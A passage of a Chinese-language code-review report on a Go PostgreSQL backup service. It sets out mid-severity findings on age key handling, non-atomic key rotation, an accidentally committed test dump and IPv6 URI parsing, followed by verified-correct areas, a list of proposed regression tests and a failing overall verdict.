**位置：** `backend/cmd/supabackup/main.go:329`、`:334`、`:379`；`backend/internal/agekey/agekey.go:37`。

**问题：** ParseIdentity 的注释声称支持 CLI 输出，实际只取最后一个非注释行；`age init > identity.txt` 的最后一行是 `Key ID: ...`，连只复制 BEGIN/END 块也会把 END 当作密钥。另先持久化 recipient、再忽略 fmt.Printf 的写错误；输出管道失败时可能把一个用户没有拿到 identity 的 recipient 设为当前配置。

**可执行修复：** stdout 输出标准 age identity 文件（说明全部为 `#` 注释），或明确仅输出可被解析的独立 identity 内容，提示送 stderr。检查输出错误并设计“公钥激活/试解密”流程，避免无法导出 identity 却报告初始化成功。私钥仍不得写数据库/日志。

**验收标准：** 生成 stdout 原样保存后自身 verify 与官方 age 工具均可读取；错误 identity 失败且不泄漏内容。stdout 写失败不留下被误认为已就绪的配置；再执行初始化/恢复流程有明确出口。

### P2-07：recipient 与 key ID 分两次更新，轮换可留下不一致配置

**位置：** `backend/internal/server/server.go:96`、`:103`；`backend/internal/server/api_phase2.go:23`；`backend/cmd/supabackup/main.go:365`。

**问题：** 两个 upsert 不在事务内，第二次失败或两次并发更新交错，可形成 recipient B + key ID A。HTTP 状态现算 fingerprint，CLI show 读存储字段，展示会不一致。当前 artifact fingerprint 由实际 recipient 计算，不能据此夸大成已加密到错误公钥；但配置审计与轮换语义不可靠。ageStatus 还忽略查询错误，数据库不可用时返回 configured=false。

**可执行修复：** 一个事务更新公钥与元数据，或 key ID 始终由规范化 recipient 派生、移除冗余持久字段；并发轮换采用 revision/CAS。读取失败返回内部错误，不冒充未配置。保存 recipient 规范形式。

**验收标准：** 第二条 SQL 故障、两个并发轮换、状态读取错误均不会返回混合或假未配置状态；历史 manifest key ID 不改变，CLI/API/新 artifact 的指纹一致。

### P2-08：提交中混入了明文数据库 dump

**位置：** `backend/internal/jobs/-`（二进制，无文本行号）；关联 `backend/internal/dumper/dumper.go:213`、`backend/internal/jobs/m1_test.go:241`。

**问题：** 12,357 字节文件确为可用 PostgreSQL custom dump，`pg_restore --list` 显示 appdb、public.m1test、TABLE DATA，源版本 18.3、dump 工具 18.4。它符合提交说明中早先 `--file=-` 写到字面文件名 `-` 的遗留产物。当前观察为测试表，未发现证据表明包含生产秘密，因此定为 P2；但把意外明文归档带入源码/构建上下文违背预期的数据边界。

**可执行修复：** 从版本库删除该非必要二进制，测试只在 TempDir 内输出，CI 检查未预期归档/明文产物；若核对发现真实数据再按实际暴露范围处理历史。不要用忽略所有 dump 文件掩盖未清理问题。

**验收标准：** 干净 checkout 运行所有测试后无 `jobs/-` 或其他明文 dump；提交 diff 和 Docker 构建上下文均不含这类偶然产物。

### P2-09：合法 IPv6 PostgreSQL URI 被 host 正则拒绝

**位置：** `backend/internal/pgclient/pgclient.go:60`、`:75`。

**问题：** `u.Hostname()` 会把 `[2001:db8::1]` 正确拆成 IPv6 地址，但 hostRe 不允许冒号，合法 bracketed IPv6 URI 被拒绝。该限制不是危险 libpq 自由参数防护所必需，也会阻断计划中的云 PG 直连地址场景。

**可执行修复：** 用标准库 IP 解析处理 IPv4/IPv6，域名另按允许规则检查；不支持 zone/multihost 时显式拒绝并说明。PGPASSFILE 中 IPv6 的冒号继续正确转义。

**验收标准：** IPv4、域名、`[::1]`、合法 IPv6 均正确解析为双方相同 host/port；非法括号、端口、zone、分隔载荷被拒绝。在具备 IPv6 网络的 CI fixture 验证 pgx 与 libpq 真连接。

## 已核实的正确部分与事实纠正

| 项目 | 评审判断 |
| --- | --- |
| 协议 A 成功链 | `dumper.go:290`–`:338` 正常路径确实检查 Wait、EncryptStream 返回值、文件 Sync、Close、rename；“输出后退出非零”被拒绝。问题主要是失败路径不收敛，以及后续本地提交/持久化，不能概括为完全没有提交链。 |
| age Close / 密文哈希 | `agekey.go:76` 检查 age writer.Close；`io.MultiWriter` 位于整个 age 输出层，header、所有数据块和 Close 写出的末块均进入 hash。没有发现只 hash 明文/漏末块的问题；现有 TestRunCommitsOnlyOnFullSuccess 也对完整落盘密文重算 hash。age 必须 Close 的语义见 [age Encrypt 文档](https://pkg.go.dev/filippo.io/age#Encrypt)。 |
| AES-GCM | 32 字节 key、随机 12 字节标准 nonce、认证标签校验、认证失败显式错误均正确。随机 nonce 是概率唯一，并非数学上保证绝不重复；在当前用途没有发现 nonce 固定或复用缺陷。没有 AAD 不是本协议下自动成立的漏洞，后续可用记录用途/版本绑定防止跨字段替换。 |
| identity / recipient | 生产数据库写入路径只存 recipient/fingerprint；API 验证 X25519 recipient，identity 仅生成 CLI 输出或 verify 的离线文件读入。没有发现 identity 落库路径。CLI 首次显示私钥本身是协议允许的交付方式，不能与把私钥写业务日志混为一谈。 |
| argv / PGPASSFILE | 正常编码路径不把 Password 加入 pg_dump argv，PGPASSFILE 权限/目录权限及 `:`、`\\` 转义正确；仍需修复参数注入、行边界、清理与关停，补真实 `/proc` 断言。0600 不意味着同 UID 进程无法读取，产品信任边界需按事实表述。 |
| SQL 注入 | 检查的生产查询使用固定 SQL 与参数占位。`taskColumns` 拼接为常量，ListTasks 动态拼接也只有受控片段；未发现用户输入 SQL 注入。m1 seed 的 fmt.Sprintf 只插入测试内部整数，不是生产 API 输入。P1-03 是另一类连接参数注入。 |
| API 认证 | 新路由仍经过 `server.go:189` 的既有 default-deny guard；未发现新增匿名访问绕过。任务 DTO 不直接返回 conn_encrypted 或完整 artifact 路径，但错误消息会泄密，见 P1-02。 |
| map / wake | cancelFns、perDB 正常生产访问受同一 mutex 保护，未发现其 Go 内存数据竞态；问题是跨 map/SQLite 的时序。wake 容量 1 的合并唤醒配合 drain 与 2 秒 poll，不会在正常单 worker 路径永久丢任务；不要误报一般性丢失唤醒。特定 reschedule 自唤醒忙循环另见 P2-01。 |
| 启动恢复 | RecoverInterrupted 确实只把 running 改为 interrupted；pending 和已有终态不被该 SQL 更改。不足是文件对账、关停和取消状态，不是这条 SQL 把 running 写成 succeeded。 |
| 客户端排序 | FindClient 实际选“同主版本，否则最小的合格较新主版本”，与注释“newest”不一致；同主版本补丁用字符串比较，`18.9` 可错误排在 `18.10` 前，应解析版本数值。现有 TestFindClientPrefersSameMajor 实际没有构造同时存在同主版本与更高版本的场景。 |
| 统计字段 | `Result.BytesDumped` 注释为明文/加密前 archive 字节，但 countingWriter 位于加密输出侧，实为密文字节，几乎重复 SizeBytes；应将计数放在 age 输入端，并明确这里是已压缩 custom archive，不是源数据库逻辑/解压后大小。 |
| 指纹 | Fingerprint 注释“前 16 个 hex 字符”错误；`sum[:16]` 实际输出 32 个 hex 字符（128 bit）。实现与本地测试采用同一值，主要需修正规范并锁定格式。 |
| `--file=-` | 对 pg_dump 输出而言 `-` 不能想当然当 stdout；当前省略 `-f` 的修复正确。PG 工具不同选项中 `-` 的含义不统一；不要把这一事实扩展为所有工具/选项都如此。源码库中的实际 `-` 归档也提供了证据。 |
| 压缩 / 恢复 | PG 当前 custom 格式默认使用 gzip/zlib 体系，不能称为未压缩；manifest 应记录实际算法/版本，不以固定描述替代可变客户端事实。新 pg_dump 可读旧服务端不意味着旧服务端/旧 pg_restore 可接受其全部输出，见 P1-15。 |

## Phase 2 必补测试清单（建议永久函数名）

下列是建议新增的回归测试名，不是声称仓库已存在这些函数。manifest/staging 当前没有测试；jobs 当前只有两个可 SKIP 的 Docker 测试，API “LifecycleAndBackupRun”也只覆盖失败注册/未知 ID，不含一次真实成功备份。

| 建议函数名 | 位置/覆盖对象 | 必须断言 |
| --- | --- | --- |
| `TestRunDrainsStderrBeyondLimit`、`TestRunPropagatesStderrReadFailure` | dumper.Run | 读到 EOF、保留有界、读错误不可提交、不会死锁。 |
| `TestRunConsumerFailureKillsProcessGroup`、`TestRunWriteENOSPCCleansArtifacts` | dumper.Run | stdout 超过 pipe 容量时消费者失败仍可及时退出；无子进程/文件残留。 |
| `TestRunCancelClosesInheritedPipesWithinDeadline` | dumper.Run | 验证真实 PID/后代、不同进程组与持管道情形；不能像现有测试给 40 秒，让 sleep 30 自己结束也算通过。 |
| `TestEncryptStreamFinalCloseFailure`、`TestRunRejectsFileSyncFailure`、`TestRunRejectsFileCloseFailure` | agekey/dumper | 注入 age 末块写、Sync、Close 失败均无最终文件/成功状态。 |
| `TestRunRenameFailure`、`TestDurableCommitDirectorySyncFailure` | dumper/jobs | rename/目录 Sync 故障可靠传播、旧有效文件不被覆盖或误删。 |
| `TestRunCiphertextHashIncludesHeaderAndFinalChunk`、`TestRunStreamingRSSBounded` | dumper | 大流与 age chunk 边界下重算完整 hash；RSS 随输入量不线性增长。 |
| `TestFindClientSameMajorWins`、`TestFindClientPatchVersionNumericOrder`、`TestFindClientProbeTimeout` | FindClient/probeVersion | 多候选、14–18、18.9/18.10、挂住的 --version；探测须有 context/超时。 |
| `TestParseURIRejectsConninfoControlInjection`、`TestParseURIRejectsMalformedQuery`、`TestParseURIAcceptsIPv6` | ParseURI/DSN | CR/VT/FF/NUL、query 转义/重复键、危险参数与合法 IPv6。 |
| `TestPGXConfigEmptyPasswordPreservesDatabase`、`TestPGXAndLibpqConnectionParity` | pgxConfig/Test/Run | 无密码、特殊字符、PG 环境、CA/证书/hostname、连接超时、真实目标一致。 |
| `TestCreateDatabaseErrorRedactsURI`、`TestCredentialCanaryAllErrorSurfaces` | API/jobs/dumper | 特殊口令覆盖错误、日志、SQLite、成功 warning、/proc argv、生成命令；fake 必须真正输出 canary。 |
| `TestPGPassfilePermissionsEscapingAndLifecycle`、`TestPGPassfileCleanupFailureReported` | dumper/staging | 执行期间 0700/0600、真实特殊口令认证、退出清理、删除失败可见。 |
| `TestEnqueueConcurrentSameDatabase`、`TestDeleteDatabaseRacesEnqueue` | jobs/API | 部分唯一约束和原子删除；串行屏障触发数据库竞态，不能仅依赖 -race。 |
| `TestCancelPendingNeverRuns`、`TestCancelDuringClaimRegistration`、`TestCancelRunningIsCanceled` | Runner | pending 不执行，claim map 窗口不丢取消，正确 canceled 终态。 |
| `TestCancelRacesFinalCommit`、`TestRunnerStopWaitsForActiveJob`、`TestRunnerStartIsIdempotent` | Runner/main | 明确取消提交边界，Stop join，无关停后新任务/访问已关闭 DB。 |
| `TestRescheduleKeepsTaskID`、`TestSingleConflictingPendingDoesNotSpin`、`TestWorkerWakeCoalescingDrainsQueue` | Runner | 稳定 ID、无忙循环、公平前进、wake 合并仍清空可执行队列。 |
| `TestRecoverInterruptedWithoutPostgres`、`TestRestartReconcilesCommittedArtifact` | recovery | 纯状态恢复不依赖 Docker；文件/manifest/SQLite 各崩溃点幂等收敛，不重 dump。 |
| `TestSuccessUpdateBusyRetainsRecoverableArtifact`、`TestSuccessUpdateRequiresOneRow` | runJob | SQLITE_BUSY/零行 UPDATE 不假成功、不永久占用数据库。 |
| `TestManifestOfflineRestoreDependencies`、`TestManifestTOCMatchesArchive`、`TestManifestSnapshotConsistency`、`TestManifestContainsNoSecrets` | manifest/pgclient | TOC、ACL-only/schema/type/default ACL/RLS 角色、locale、扩展、LO/FDW、并发 DDL与秘密排除。 |
| `TestStagingQuotaPreflightAndStreamingLimit`、`TestOrphanCleanupPreservesLiveArtifacts`、`TestOrphanCleanupReportsRemoveErrors` | staging | 配额与空间分别验证，保护引用，临时文件/凭据清理可观测。 |
| `TestClassifyErrorSQLStateAndIOErrors`、`TestTaskErrorCodeRetryabilityContract` | pgclient/jobs/API | 稳定分类、机器错误码、retryable、取消与停机区别。 |
| `TestAgeInitOutputCanBeVerified`、`TestAgeInitOutputFailureDoesNotActivateKey`、`TestRecipientUpdateAtomic` | CLI/server | 离线 key 文件可直接用、输出失败安全、公钥/指纹原子一致；identity 不入 SQLite。 |
| `TestM1_RestoreWithoutApplicationState`、`TestM1_DetectsMissingOrCorruptRestoredRows`、`TestM1_ClientRestoreMatrix` | M1 | 独立 age/PG 工具、新集群、无应用/SQLite/主密钥、真实内容/结构核对、14–18 支持组合，CI 不得跳过。 |

现有测试还应修正两个误导性断言：`dumper_test.go:123` 等失败路径检查仅拒绝“非 .inprogress、非 creds 的文件”，实际允许残留临时文件/凭据；`TestSecretCanaryNeverEscapes` 未检查 `/proc`，也未让 fake 输出秘密，不能作为四出口脱敏证据。

## 总体结论与最关键 3 件事

**未通过。** 构建和可执行的单元检查通过，不能抵消已复现的参数注入、凭据泄漏、管道阻塞和状态机缺陷；真实 PG/M1 本轮受环境限制未重新执行，既有 M1 又存在核对源库的错误。在以上 P1 完成并有对应回归证据前，不应标记 Phase 2 或 M1 完成。

1. **先封住连接与凭据边界：** 修复完整 conninfo 编码、URI 错误/日志脱敏、PG 环境与 TLS/CA 一致性，并用特殊字符 canary 验证全部出口。
2. **让执行与提交可靠收敛：** 持续排空管道、消费者失败取消进程组；补取消/入队/删除/关停的原子性，以及文件持久化、失败产物引用和启动恢复。
3. **重做可信的恢复门禁：** 补完整 manifest、依赖与支持矩阵，使用独立 age/PG 工具在无应用状态的新集群核对恢复数据；故意破坏恢复结果必须让 M1 失败。
